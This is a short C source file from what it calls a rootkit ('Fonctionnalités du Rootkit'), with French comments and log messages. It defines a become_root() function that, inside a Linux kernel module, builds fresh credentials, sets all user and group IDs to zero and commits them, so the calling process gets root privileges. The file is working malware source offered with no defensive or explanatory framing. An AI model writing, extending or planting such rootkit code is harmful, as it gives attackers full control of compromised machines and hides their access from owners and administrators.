/*
*
* Fonctionnalités du Rootkit
*
*/

#include "rootest.h"

int become_root() {

  struct cred *new_creds = prepare_kernel_cred(NULL);
  if (new_creds) {
    new_creds->uid.val = new_creds->gid.val = 0;
    new_creds->euid.val = new_creds->egid.val = 0;
    new_creds->suid.val = new_creds->sgid.val = 0;
    new_creds->fsuid.val = new_creds->fsgid.val = 0;
    commit_creds(new_creds);
    printk(KERN_INFO "Elévation de privilèges !\n");
    return 0;
  }
  printk(KERN_INFO "Echec du become root\n");
  return 1;

}
